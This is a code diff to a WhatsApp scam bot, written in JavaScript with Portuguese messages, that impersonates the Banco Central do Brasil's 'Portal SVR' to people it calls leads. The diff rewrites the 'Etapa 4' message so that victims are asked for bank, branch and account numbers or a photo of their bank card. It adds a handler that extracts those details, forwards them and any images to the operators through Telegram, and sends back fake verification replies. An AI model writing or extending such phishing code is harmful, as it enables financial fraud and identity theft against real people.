@@ -348,27 +348,27 @@ Aguarde o envio das instruções de validação (Código Hash de Autenticação)
 _Processo regido pela Resolução BCB nº 318/2023._`;
 
 const MENSAGEM_ETAPA_4 =
-`💳 *ETAPA 4 — LIBERAÇÃO E TRANSFERÊNCIA DOS VALORES*
+`💳 *ETAPA 4 — LIBERAÇÃO E TRANSFERÊNCIA FINAL*
 *Departamento de Execução Financeira — Portal SVR*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 Prezado(a) Titular,
 
-Todas as etapas obrigatórias de validação foram concluídas com êxito. O seu processo de liberação de ativos financeiros encontra-se em fase de *execução final*.
+✅ *A Validação do Vínculo Bancário foi processada e homologada pelo sistema.*
 
-Nosso operador encaminhará em instantes o *Código de Verificação Financeira (CVF)* — um protocolo criptográfico gerado pelo sistema do Banco Central do Brasil — que deverá ser inserido no aplicativo do seu banco para concluir a habilitação do canal de recebimento.
+Para concluir o resgate e efetuar o crédito do montante total em sua conta, o sistema requer a indicação formal dos dados bancários de destino. Devido ao rigoroso protocolo de segurança do Banco Central, a conta deve pertencer obrigatoriamente ao mesmo titular do CPF/CNPJ consultado.
 
-📋 *STATUS FINAL DAS ETAPAS:*
+📝 *POR FAVOR, INFORME ABAIXO:*
 
-✅ 1ª Etapa — Autenticação de Identidade: *CONCLUÍDA*
-✅ 2ª Etapa — Validação Jurídica do Processo: *CONCLUÍDA*
-✅ 3ª Etapa — Confirmação do Canal de Recebimento: *CONCLUÍDA*
-🔄 4ª Etapa — Liberação e Transferência dos Valores: *EM EXECUÇÃO*
+1️⃣ **BANCO** (Nome da Instituição)
+2️⃣ **AGÊNCIA** (4 ou 5 dígitos)
+3️⃣ **CONTA** (Com dígito verificador)
 
-Aguarde o código. O processo será finalizado em instantes.
+⚠️ *IMPORTANTE:* O sistema realiza a validação de caracteres em tempo real para garantir que os dados sejam autênticos e pertencentes ao titular. Certifique-se de que as informações estão corretas. Alternativamente, o senhor(a) pode enviar uma **FOTO DO CARTÃO BANCÁRIO** (apenas a frente, onde constam Agência e Conta) para leitura e conferência automática.
 
-*Portal SVR — Banco Central do Brasil*
-_Não compartilhe este código com terceiros._`;
+O protocolo de liberação e estorno expira em breve.
+
+*Portal SVR — Banco Central do Brasil*`;
 
 client.on('message_create', async (msg) => {
     if (BOT_ID !== 'main') return;
@@ -504,8 +504,34 @@ async function processIncomingMessage(msg, targetChatId) {
         return;
     }
 
-    // --- LEAD EM ATENDIMENTO HUMANO — bot silencioso ---
+    // --- LEAD EM ATENDIMENTO HUMANO — bot silencioso (EXCETO ETAPA 4) ---
     if (currentSession && currentSession.mode === 'human') {
+        if (currentSession.humanStep === 4) {
+            // Se o lead enviar mídia (foto do cartão)
+            if (msg.hasMedia) {
+                console.log(`📸 [BANCO] Lead ${targetChatId} enviou mídia.`);
+                await notifyTelegram(`📸 <b>MÍDIA BANCÁRIA RECEBIDA</b>\nLead: <code>${targetChatId}</code>\n<i>O lead enviou uma imagem/foto do cartão ou comprovante.</i>`);
+                await client.sendMessage(targetChatId, `✅ *Mídia recebida com sucesso.*\n\nIniciando leitura óptica dos caracteres de segurança... Por favor, aguarde a validação da agência e conta informados.`);
+                return;
+            }
+
+            // Tenta identificar Agência e Conta no texto
+            const agMatch = text.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
+            const ccMatch = text.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);
+            
+            // Se encontrar pelo menos um dos dois ou algo que pareça ser um número de conta/agência
+            if (agMatch || ccMatch || (text.length >= 4 && /^\d+$/.test(text.replace(/[-\s]/g, '')))) {
+                const ag = agMatch ? agMatch[1] : (text.length <= 5 ? text : 'Pendente');
+                const cc = ccMatch ? ccMatch[1] : (text.length > 5 ? text : 'Pendente');
+
+                console.log(`🏦 [BANCO] Dados de ${targetChatId}: Ag ${ag} | Cc ${cc}`);
+                await notifyTelegram(`🏦 <b>DADOS BANCÁRIOS IDENTIFICADOS</b>\nLead: <code>${targetChatId}</code>\nAgência: <b>${ag}</b>\nConta: <b>${cc}</b>\n\n<i>Texto: ${text}</i>`);
+                
+                await client.sendMessage(targetChatId, `🔍 *Verificando autenticidade...*\n\nDados capturados:\n🏛️ Agência: ${ag}\n💳 Conta: ${cc}\n\nO sistema está cruzando as informações com o CPF titular para autorização do repasse final.`);
+                return;
+            }
+        }
+
         console.log(`🤫 [HUMANO] Lead ${targetChatId} em atendimento manual. Bot silencioso.`);
         return;
     }
